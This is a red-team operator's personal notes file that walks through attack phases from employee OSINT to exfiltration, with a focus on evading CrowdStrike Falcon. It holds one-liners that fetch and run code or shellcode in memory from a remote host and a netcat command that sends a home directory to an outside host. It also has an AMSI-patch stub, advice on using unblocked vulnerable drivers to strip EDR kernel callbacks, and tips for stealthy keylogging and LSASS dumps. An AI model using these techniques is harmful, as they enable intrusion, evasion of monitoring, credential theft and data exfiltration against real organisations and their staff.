# Offensive Security Notes: Unredacted  
**Be advised: hot takes ahead. All notes are based on my experiences and are opinions not facts.**
**When I talk about OPSEC, it focuses around CrowdStrike. Most of my experience involves going against it. I plan to experiment more with MDE due to its easy integration with the Microsoft ecosystem.**


## Guides 
https://web.archive.org/web/20221126165225/https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html#enumeration
https://kolegite.com/EE_library/books_and_lectures/%D0%9A%D0%B8%D0%B1%D0%B5%D1%80%D1%81%D0%B8%D0%B3%D1%83%D1%80%D0%BD%D0%BE%D1%81%D1%82/RTFM%20Red%20Team%20Field%20Manual%20v2%20--%20Ben%20Clark%20%26%20Nick%20Downer.pdf
https://paper.bobylive.com/Security/The_Red_Team_Guide_by_Peerlyst_community.pdf

- [OSINT](#osint)  
- [External Recon](#external-recon)  
- [Resource Development](#resource-development)  
- [Initial Access](#initial-access)  
- [Execution](#execution)  
- [Defense Evasion](#defense-evasion)  
- [Command & Control](#command--control) 
- [Persistence](#persistence) 
- [Privilege Escalation](#privilege-escalation)   
- [Credential Access](#credential-access)  
- [Lateral Movement](#lateral-movement)  
- [Exfiltration](#exfiltration)  

---

## OSINT

<table>
  <tr>
    <td>LinkedIn</td>
    <td>You can filter by company and it shows employees. It also shows people based on type of degree (allows you to profile targets). You can use a VPN and a dummy account.</td>
  </tr>
  <tr>
    <td>Employee Collection</td>
    <td>Most companies use Gmail and Outlook. Most employee emails are first.lastname@domain.com, firstname@domain.com, or lastname-first_initial-second_initial@domain.com. Even if you get preferred names from LinkedIn, you can use sites like TruePeopleSearch to get full names, phone numbers, and addresses. You can also use IDCrawl to find social media accounts.</td>
  </tr>
  <tr>
    <td>Targeting</td>
    <td>You can build a mind map on individuals, including prioritization of targeting.</td>
  </tr>
</table>


---

## External Recon

<table>
  <tr>
    <td>Protocol Recon via Packet Grep</td>
    <td>
      <pre><code>sudo ngrep -i -d &lt;network interface&gt; 's.?a.?m.?b.?a.*[[:digit:]]' port 139
smbclient -U '%' -N -L \\\\10.10.10.10\\</code></pre>
    </td>
  </tr>
  <tr>
    <td>Using Shodan to Retrieve Open Ports and Info</td>
    <td>
      <pre><code>nmap -sn -Pn -n --script=shodan-api --script-args 'shodan-api.apikey=XXXXXX' worldsworstwebsiteever.com</code></pre>
    </td>
  </tr>
  <tr>
    <td>Firewall Evasion</td>
    <td>
      <a href="https://github.com/kritikakatyal/Firewall-Evasion-Techniques-Analysis" target="_blank">Firewall Evasion Techniques</a>
    </td>
  </tr>
</table>

## Resource Development

<table>
  <tr>
    <td>Compile C++ with cl.exe</td>
    <td>
      <pre><code>cl.exe /nologo /MT /Ox /W0 /GS- /EHs- /GR- /DNDEBUG /Tp bubble_sort.cpp /link kernel32.lib /OUT:bubble_sort.exe /SUBSYSTEM:WINDOWS /MACHINE:x64 /ENTRY:WinMain /NODEFAULTLIB /MERGE:.rdata=.text /MERGE:.pdata=.text /MERGE:.data=.text</code></pre>
    </td>
  </tr>
  <tr>
    <td>Compile assembly with MASM</td>
    <td>
      <pre><code>ml64 /c syscalls.asm /Fo syscalls.obj</code></pre>
    </td>
  </tr>
  <tr>
    <td>Compile C# with csc.exe</td>
    <td>
      <pre><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /optimize+ /debug- .\data_recovery.cs</code></pre>
    </td>
  </tr>
  <tr>
    <td>Compile C# with Roslyn Compiler</td>
    <td>
      <pre><code>& "C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\Roslyn\csc.exe" /optimize+ /unsafe /debug- .\program.cs .\Structs.cs</code></pre>
    </td>
  </tr>
  <tr>
    <td>Publish .NET Application</td>
    <td>
      <pre><code>dotnet publish -c Release -r win-x64 --self-contained /p:PublishSingleFile=true /p:PublishTrimmed=true /p:EnableCompressionInSingleFile=true</code></pre>
    </td>
  </tr>
  <tr>
    <td>Convert COM Type Library to .NET Assembly</td>
    <td>
      <pre><code>tlbimp C:\Windows\System32\wsmauto.dll /out:WSManAutomation.dll</code></pre>
    </td>
  </tr>
  <tr>
    <td>Add Reference to .NET Project</td>
    <td>
      <pre><code>dotnet add reference WSManAutomation.dll</code></pre>
    </td>
  </tr>
  <tr>
    <td>FreeBSD Cross-Compile with Clang</td>
    <td>
      <pre><code>clang --target=x86_64-unknown-freebsd12.2 --sysroot=/root/cross_compiler/freebsd-12.2-sysroot -I/root/cross_compiler/freebsd-12.2-sysroot/usr/include -L/root/cross_compiler/freebsd-12.2-sysroot/usr/lib -o shell shell.c -fPIC</code></pre>
    </td>
  </tr>
  <tr>
    <td>Writing Shellcode for Windows x64</td>
    <td>
      <p>Source: <a href="https://nytrosecurity.com/2019/06/30/writing-shellcodes-for-windows-x64/">Nytro Security Blog</a></p>
    </td>
  </tr>
  <tr>
    <td>Writing stager for Windows x64</td>
    <td>
      <p>Source: <a href="https://github.com/ahmedkhlief/Ninja/blob/master/core/agents/cmd_shellcodex64.ninja">GitHub - Ninja Shellcode</a></p>
    </td>
  </tr>
  <tr>
    <td>Defuse Assembler</td>
    <td>
      <p>Tool: <a href="https://defuse.ca/online-x86-assembler.htm">Online tool to convert x86/x64 assembly into raw shellcode bytes.</a></p>
    </td>
  </tr>
</table>

---

## Initial Access

<table>
    <tr>
    <td>Phishing/Smishing</td>
    <td>
      <a href="https://medium.com/sud0root/mastering-modern-red-teaming-infrastructure-part-7-advanced-phishing-techniques-for-2fa-bypass-85f9adc4dc3b" target="_blank">Medium: Advanced Phishing Techniques for 2FA Bypass</a> -  
      MFA is becoming more popular, and companies usually only provide phones to higher‑level employees. As a result, most employees use their personal phones.
    </td>
    </tr>
  <tr><td>MOTW bypass</td><td>tar.gz bypasses motw and can be extracted with 7-zip. Falcon flags on using tar from windows due to lolbin</td></tr>
  <tr>
    <td>Excel</td>
    <td>
      <a href="https://github.com/mttaggart/xllrs" target="_blank"> Rust XLL</a> - Microsoft blocks macros in documents originating from the internet (email and web download), XLL (Excel Add-Ins) are dlls loaded by Excel. Still get warning for no signature. Need legitimate code signing certificate to avoid this.
    </td>
    </tr>
    <tr>
    <td>Supply Chain</td>
    <td>
      <a href="https://github.com/0x-Apollyon/Malicious-VScode-Extension" target="_blank">VS Code Plugin </a> -
      I have seen many developers trust and install plugins that come from the Visual Studio Code marketplace. <a href="https://www.bleepingcomputer.com/news/security/malicious-vscode-extensions-with-millions-of-installs-discovered/" target="_blank"> - Israeli researchers target Darcula plugin</a>
    </td>
    </tr>
    <tr>
    <td>WAF</td>
    <td>
      <a href="https://github.com/botesjuan/Obfuscating-Techniques-WAF-Bypass" target="_blank">Obfuscation Tricks</a>
    </td>
    </tr>
  <tr>
    <td>Routers</td>
    <td>
      Will fill in, but popping these is how nation-states get in.
    </td>
    </tr>
    <tr>
  <td>Insecure Deserialization</td>
  <td>
    <a href="https://www.youtube.com/watch?v=t-zVC-CxYjw" target="_blank">Insecure Deserialization Explained</a>
  </td>
</tr>

</table>

---

## Execution

<table>
  <tr>
    <td>PowerUp in Memory (CMD)</td>
    <td>
      <pre><code>echo IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/PowerUp.ps1') | powershell -noprofile -</code></pre>
    </td>
  </tr>
  <tr>
    <td>PowerUp in Memory (PowerShell)</td>
    <td>
      <pre><code>wget('http://10.10.10.10/PowerUp.ps1') -UseBasicParsing | iex</code></pre>
    </td>
  </tr>
  <tr>
    <td>Python3 ELF In-Memory (No Params)</td>
    <td>
      <pre><code>python3.7 -c 'import os, urllib.request; d=urllib.request.urlopen("http://10.10.0.103/test.exe"); fd=os.memfd_create("foo"); os.write(fd,d.read()); p=f"/proc/self/fd/{fd}"; os.execve(p, [p], {})'</code></pre>
    </td>
  </tr>
  <tr>
    <td>Python3 ELF In-Memory (With Params)</td>
    <td>
      <pre><code>python3 -c 'import os; import urllib.request; d = urllib.request.urlopen("https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap?raw=true"); fd = os.memfd_create("foo"); os.write(fd, d.read()); p = f"/proc/self/fd/{fd}"; os.execve(p, [p,"-Pn", "-n", "127.0.0.1"], {})'</code></pre>
    </td>
  </tr>
  <tr>
    <td>Python2 Shellcode Execution</td>
    <td>
      <pre><code>/usr/bin/python -c 'import urllib2,mmap,ctypes;d=urllib2.urlopen("http://10.10.10.10/a").read();m=mmap.mmap(-1,len(d),34,7);m.write(d);ctypes.CFUNCTYPE(None)(ctypes.addressof(ctypes.c_char.from_buffer(m)))()'</code></pre>
    </td>
  </tr>
  <tr>
    <td>Python2 Temp ELF Execution</td>
    <td>
      <pre><code>/usr/bin/python -c 'import os,urllib2,tempfile;d=urllib2.urlopen("http://10.10.10.10/config").read();f=tempfile.NamedTemporaryFile(delete=False);f.write(d);f.close();os.chmod(f.name,0755);os.execve(f.name,[f.name,"-pthread"],{})'</code></pre>
    </td>
  </tr>
</table>

---

## Defense Evasion  
*EDR evasion for shellcode loaders is covered separately in `MalwareDevelopment.md`.*

<table>
  <tr>
 <td>BYOD – Removing Kernel Callbacks</td>
<td>
  - For most standard red team operations, I am generally against using kernel drivers or rootkits. However, I do see their value in long-term intelligence and persistence operations. This Defcon talk provides a solid overview of rootkits: 
  <a href="http://web.archive.org/web/20240616103916/https://exploitreversing.com/wp-content/uploads/2021/12/defcon2018-2.pdf" target="_blank">Defcon 2018 Rootkits Talk (PDF)</a>.

  Loading a kernel driver requires Administrator privileges. As noted in this <a href="https://www.elastic.co/security-labs/forget-vulnerable-drivers-admin-is-all-you-need" target="_blank">Elastic blog post</a>, "Administrative processes and users are considered part of the Trusted Computing Base (TCB) for Windows and are therefore not strongly isolated from the kernel boundary." While this precedent contradicts foundational computer science and operating system principles, it reflects Microsoft's stance on the matter.

  Numerous examples exist of using signed vulnerable drivers to disable EDR solutions, though most do not affect Falcon. One such project is <a href="https://github.com/zer0condition/mhydeath?tab=readme-ov-file" target="_blank">MHYDEATH</a>, which loads a vulnerable signed driver and terminates the userland components of many EDR solutions. In Falcon's case, most functionality resides in `csagent.sys`, which will simply restart the userland component and trigger a high alert for Defense Evasion.

  The `csagent.sys` driver is not registered like typical Windows kernel drivers and behaves much like a rootkit. Attempting to terminate it results in a BSOD, so the next best strategy is to neutralize its callbacks.  

A list of kernel callbacks can be found here.  
<a href="https://codemachine.com/articles/kernel_callback_functions.html" target="_blank">Kernel Callbacks</a>

  A useful project for removing kernel callbacks is <a href="https://github.com/lawiet47/STFUEDR/tree/main" target="_blank">STFUEDR</a>. I recommend combining its approach with MHYDEATH’s functionality by embedding the driver as a buffer during compilation rather than loading it from disk.

  STFUEDR also uses the RTCore driver, which is listed on the <a href="https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/microsoft-recommended-driver-block-rules#vulnerable-driver-blocklist-xml" target="_blank">Microsoft Vulnerable Driver Blocklist</a>. This blocklist is enabled by default starting with Windows 11, so you must choose a vulnerable driver that is not included in that list to avoid automatic blocking.

  One such alternative is the <a href="https://github.com/Dor00tkit/DellInstrumentation_PoC/tree/main" target="_blank">DellInstrumentation PoC</a> project. The DellInstrumentation driver isn't on the Microsoft Vulnerable Driver Blocklist.
</td>
  </tr>
  <tr>
    <td>AMSI Bypass (clr.dll)</td>
    <td>
      <a href="https://github.com/backdoorskid/ClrAmsiScanPatcher" target="_blank">ClrAmsiScanPatcher</a>  
      - Patch the `AmsiScan` function located in `clr.dll` to disable AMSI scanning for .NET assemblies.
    </td>
  </tr>
  <tr>
    <td>64-bit AMSI Bypass (Custom Patch)</td>
    <td>
      <code>
        xor eax, eax ; clear eax<br>
        shl eax, 16 ; shift eax left by 16 bits<br>
        or ax, 0x57 ; Set the lower 16 bits value to 0x57<br>
        ret
      </code><br>
      - A custom patch for `AmsiScanBuffer` that sets the return value to `S_OK` (0x00000057), effectively bypassing AMSI by faking a clean scan result.
    </td>
  </tr>
  <tr>
    <td>ETW Bypass (EAT Hook)</td>
    <td>
      <a href="https://www.unknowncheats.me/forum/c-and-c-/50426-eat-hooking-dlls.html" target="_blank">EAT Hooking Example</a>  
      - Use an Export Address Table (EAT) hook on ADVAPI32's `EventWrite` to redirect to a dummy function that returns, effectively suppressing ETW logging.
    </td>
  </tr>
  <tr>
    <td>ETW Bypass (Egghunter)</td>
    <td>
      <a href="https://github.com/Kara-4search/BypassETW_CSharp" target="_blank">BypassETW_CSharp</a>  
      - Load `RtlInitializeResource` and use an egghunter pattern to locate and patch ETW structures in memory.
    </td>
  </tr>
  <tr>
    <td>ETW Bypass (PowerShell)</td>
    <td>
      <a href="https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32" target="_blank">ETW Patch via PowerShell</a>  
      - Uses reflection to set `System.Management.Automation.Tracing.PSEtwLogProvider.etwProvider.m_enabled` to `0`, disabling Suspicious ScriptBlock Logging in PowerShell.
    </td>
  </tr>
  <tr>
    <td>WDAC Bypass</td>
    <td>
      <a href="https://github.com/bohops/UltimateWDACBypassList" target="_blank">Ultimate WDAC Bypass List</a>  
      - A centralized resource for previously documented bypass techniques targeting WDAC, Device Guard, and UMCI. Includes examples of LOLBIN abuse, unsigned code execution vectors, and policy misconfigurations that allow attackers to evade application control.
    </td>
  </tr>
  <tr>
    <td>CLM Bypass</td>
    <td>
      <a href="https://github.com/Above2/Bypass/tree/main" target="_blank">CLM Bypass Tool</a>  
      - A stripped-down version of the original `bypass-clm` project, designed to bypass PowerShell's Constrained Language Mode using `installutil.exe`. Commands can be passed via command-line switches, files, or base64 strings for flexible execution.
    </td>
  </tr>
  <tr>
  <td>AV Bypass</td>
 <td>
  <a href="https://github.com/cwolff411/powerob/tree/master" target="_blank">PowerOb</a>  
  - A script to obfuscate `PowerUp.ps1`, helping evade static and signature-based detection by Windows Defender.
  <br><br>
  <a href="https://github.com/Trigleos/ELFREVGO.git" target="_blank">ELFREVGO</a>  
  - A tool to obfuscate ELF binaries using custom code generation and function redirection to evade static analysis and signature-based detection on Linux systems.
  <br><code>ELFREVGO/bin/ELFREVGO -f test -e -t -n -gd execve -gf custom_logger -o testx</code>
  <br><br>
  <a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/discovery_suid_sguid_enumeration.toml" target="_blank">Elastic SUID rule</a>  
  - A unique method to enumerate SUID binaries that evades this rule.
  <br><code>find / -type f 2>/dev/null -exec stat -c "%A %n" {} + | grep '^...s'</code>
</td>
</tr>
</table>


---

## Command & Control

<table>
  <tr><td><b>Subcategory</b></td><td><b>Description / Notes</b></td></tr>
  <tr><td>Beacon Profiles</td><td>Low-and-slow configs, jitter tuning, domain fronting tricks</td></tr>
  <tr><td>Frameworks & Custom Tooling</td><td>Cobalt Strike, Sliver, custom implants, OPSEC-safe builds</td></tr>
  <tr><td>Infrastructure Setup</td><td>Redirectors, staging servers, domain blending, TLS fingerprinting</td></tr>
</table>

---

## Persistence

<table>
  <tr><td>Startup Execution</td><td>upload .lnk to "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\" via C2 and point it to your loader. The file creation would be seen by a MiniFilter driver, but that alone won't flag Falcon.</td></tr>
  <tr><td>DLL Sideloading</td><td>Teams, VS Code, and OneDrive are vulnerable to DLL sideloading via version.dll, dbghelp.dll, and userenv.dll</td></tr>
<tr><td>Non-Opsec Techniques</td><td> Registry modifications trigger the CmRegisterCallbackEx kernel callback, and there's a good chance Falcon flags it. WMI event subscriptions used to be stealthy, but many APTs (including APT29) have abused them, and they are now monitored more aggressively. [Google Threat Intelligence – APT29 abuse](https://cloud.google.com/blog/topics/threat-intelligence/dissecting-one-ofap)</td></tr>
</table>


---

## Credential Access

<table>
  <tr><td><b>Subcategory</b></td><td><b>Description / Notes</b></td></tr>
  <tr><td>Browser Credential Theft</td><td><a href="https://github.com/djhohnstein/SharpChromium">SharpChromium</a> – .NET 4.0 CLR project to retrieve Chromium data such as cookies, history, and saved logins</td></tr>
  <tr><td>NetNTLM Hash Leaks</td><td><a href="https://www.securify.nl/en/blog/living-off-the-land-stealing-netntlm-hashes/"> Stealing Hashes with Responder</a> - SMB signing is enabled by default only on Domain Controllers; Windows endpoints must manually enable it. UNC path internet shortcuts can leak NetNTLM hashes simply by being viewed. 

  In Active Directory environments, it's common to have domain fileshares accessible by many endpoints. Dropping .url on a share with many files is a common tactic. Even with SMB signing enabled, this does not prevent hash leaks via WebDAV or HTTP if a user clicks an internet shortcut or views the link.</td></tr>
 <tr><td>Keyloggers</td><td><a href="https://github.com/d1rkmtrr/TakeMyRDP">RDP session hijacking</a> – Keyloggers are another method for capturing cleartext credentials. RDP is still commonly used within internal networks, and a frequent scenario where this attack applies is when users log into jump boxes via Remote Desktop. 

 The tool performs keyboard hooking only when the user is focused on a Remote Desktop session, making it more stealthy than generic keyloggers that hook the keyboard continuously and record everything typed. However, it remains memory-intensive. 

A tip for optimizing keyloggers is adding a millisecond delay at the end of each hooking procedure to reduce CPU usage. It's also best to store captured characters in in-memory buffers rather than writing to disk. Logging should occur over the current C2 session comms. This code would be best optimized and utilized as a BOF.</td></tr>
<tr><td>LSASS Dumping</td><td><a href="https://github.com/wtechsec/LSASS-Forked-Dump---Bypass-EDR-CrowdStrike/tree/main">LSASS-Forked-Dump</a> – Overall, I am not a fan of LSASS dumping; I think it is an extreme opsec hazard especially against Falcon. But there are instances where having ntlm can be useful.

I highly doubt the code in that link bypasses Falcon, but the fundamentals of forking and dumping from the non-main LSASS process is a good principle. I would also add that after doing the dump, you should overwrite the MDMP header and avoid saving it to disk. This is another example of code that should be implemented as a BOF file or .NET assembly that can be run in memory, with the dump directly transferred over the wire.</td></tr>
</table>

---


## Lateral Movement

<table>
  <tr>
    <td>WMI</td>
    <td>
      <a href="https://github.com/XiaoliChan/wmiexec-Pro/tree/main" target="_blank">wmiexec-Pro GitHub</a>  
      - WMI Event Subscriptions and `Win32_Process` are heavily monitored by Falcon. This technique doesn't rely on `Win32_Process`. I will update in the future if it bypasses Falcon.
    </td>
  </tr>
  <tr>
    <td>WinRM</td>
    <td>
      <a href="https://github.com/bohops/WSMan-WinRM" target="_blank">WSMan-WinRM GitHub</a>  
  </tr>
</table>


---

## Privilege Escalation

<table>
  <tr>
    <td>Windows POCs</td>
    <td>
      <a href="https://github.com/ycdxsb/WindowsPrivilegeEscalation" target="_blank">Windows POCs</a>  
    </td>
  </tr>
  <tr>
    <td>BOF Kernel Exploit</td>
    <td>
      <a href="https://github.com/apkc/CVE-2024-26229-BOF/tree/main" target="_blank">BOF kernel exploit example</a> -   
      Overwriting the EPROCESS structure, specifically the token field with a SYSTEM token, is a common privilege escalation method; however, it is not considered OPSEC safe. Falcon will receive ObRegisterCallback in the kernel and flag it as token access manipulation.
    </td>
  </tr>
  <tr>
    <td>UAC Bypass</td>
    <td>
      <a href="https://github.com/sexyiam/UAC-Bypass/tree/main" target="_blank">UAC-Bypass</a>  
      - Many companies still have user accounts that are local administrators for their Windows endpoints. 
    </td>
  </tr>
  <tr>
    <td>SeImpersonation</td>
    <td>
      <a href="https://github.com/tylerdotrar/SigmaPotato" target="_blank">SigmaPotato</a>  
      - In Windows, web servers and database services often inherit the SeImpersonatePrivilege by default. Microsoft has stated that elevating from a Local Service process (with SeImpersonate) to SYSTEM is "expected behavior" — making this a non-patchable issue.
    </td>
  </tr>
  <tr>
    <td>In-depth AD Exploitation</td>
    <td>
      <a href="https://zer1t0.gitlab.io/posts/attacking_ad/" target="_blank">Attacking Active Directory</a>  
    </td>
  </tr>
  <tr>
    <td>Common AD Exploitation Techniques</td>
    <td>
      <a href="https://en.hackndo.com/" target="_blank">Hackndo Blog</a>
    </td>
  </tr>
  <tr>
    <td>ADCS Exploitation Techniques</td>
    <td>
      <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-certificate-services" target="_blank">ADCS Cheatsheet</a>
    </td>
  </tr>
</table>


---

## Exfilitration

<table>
  <tr>
    <td>Exfil via Embedded Linux</td>
    <td>
      <pre><code>nc -l -p 1234 | tar xf -
tar cf - /home/debian | nc 10.10.10.10 1234</code></pre>
    </td>
  </tr>
  <tr>
    <td>Exfil via SMB</td>
    <td>
      <pre><code>smbclient \\\\10.10.10.10\\share -p &lt;Port&gt; -N -Tc share.tar
tar xf share.tar -C share</code></pre>
    </td>
  </tr>
</table>
